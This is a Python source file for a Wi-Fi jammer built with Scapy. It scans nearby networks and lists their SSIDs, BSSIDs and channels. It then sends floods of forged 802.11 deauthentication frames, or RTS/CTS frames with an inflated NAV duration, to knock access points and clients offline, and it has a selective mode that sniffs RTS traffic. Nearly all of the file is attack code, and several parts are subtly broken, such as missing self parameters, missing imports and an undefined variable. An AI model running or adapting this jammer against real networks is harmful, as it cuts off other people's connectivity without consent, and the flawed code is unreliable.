from scapy.all import *
from wifi import Cell
import time
from wireless import Wireless

class Jammer():

    # Calculate the time to Jam
    def calcule_time(time):
        time = int(time)

        time = (60*time)/0.032767

        time = int(time)

        return time

    # Get the mac of the card
    def get_mac(card):
        card_mac = subprocess.Popen('ifdata -ph {}'.format(card), stdout=PIPE, shell=True).stdout
        card_mac = card_mac.read()
        card_mac = card_mac.decode()
        return card_mac

    # Network scanner
    def network_scan(self):
        wifi_card = Wireless()
        interface = wifi_card.interface()
        wifi_collect = Cell.all(interface)
        print ("Available networks scan in progress ...")
        print ("#" * 70)
        bssid = []
        time.sleep(2)
        numero = 0
        for wi in wifi_collect:
            print("Network number: " + str(numero))
            print("SSID: " + wi.ssid)
            print("BSSID: " + wi.address)
            print("Channel: " + str(wi.channel))
            #print("Quality: " + str(wi.quality))
            print("+-" * 10)
            bssid.append(wi.address)
            time.sleep(0.5)
            numero += 1
        print ("#" * 70)
        return bssid

    # Function for Deauthentication jammer
    def jam_dea(address, card, client, time):
    	conf.verb = 0
    	packet = RadioTap()/Dot11(addr1=client,addr2=address,addr3=address)/Dot11Deauth()
    	print("Jamming network: " + address)
    	sendp(packet, iface = card, count=time, inter=0.0001) #Send deauth packet
    	subprocess.call('airmon-ng stop {}'.format(card), shell=True)
    	print('\nEnd of jammer.')
    	sys.exit()

    # Function for NAV jammer
    def jam_nav(address, card, card_mac, sub, time):
        conf.verb = 0
        if sub == 'rts':
            packet = RadioTap()/Dot11(type=1,subtype=11,addr1=address,addr2=card_mac,addr3=address, ID=0xFF7F)
        else:
            packet= RadioTap()/Dot11(type=1,subtype=12,addr1=address, addr2=card_mac, ID=0xFF7F)
        print("Jamming network: " + address + " through: " + card + " with mac interface: " + card_mac)
        sendp(packet, iface = card, count=time, inter=0.032767)
        #Stop monitor mode
        subprocess.call('airmon-ng stop {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
        print('\nEnd of jammer. Probably you will have to reboot your computer if your network card does not work correctly')

    # Function for selective NAV jammer
    def jam_sel(address, card, card_mac, time):
        #conf.verb = 0  # shut up Scapy
        sniff(iface=card, stop_filter= packet_handler(time))
        subprocess.call('airmon-ng stop {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
        print('\nEnd of jammer. Probably you will have to reboot your computer if your network card does not work correctly')

    # Function for sniff in the selective jammer
    def packet_handler(pkt, time):
        while True:
            try:
                if pkt.haslayer(Dot11FCS) and pkt.type == 1 and pkt.subtype == 11:
                    packet = RadioTap()/Dot11(type=1,subtype=11,addr1=pkt.addr2, addr2='00:C0:CA:98:02:B5',addr3=pkt.addr2, ID=0xFF7F)
                    packet.show()
                    sendp(packet, iface = card, count=time, inter=0.032767)
            except KeyboardInterrupt:
                pass
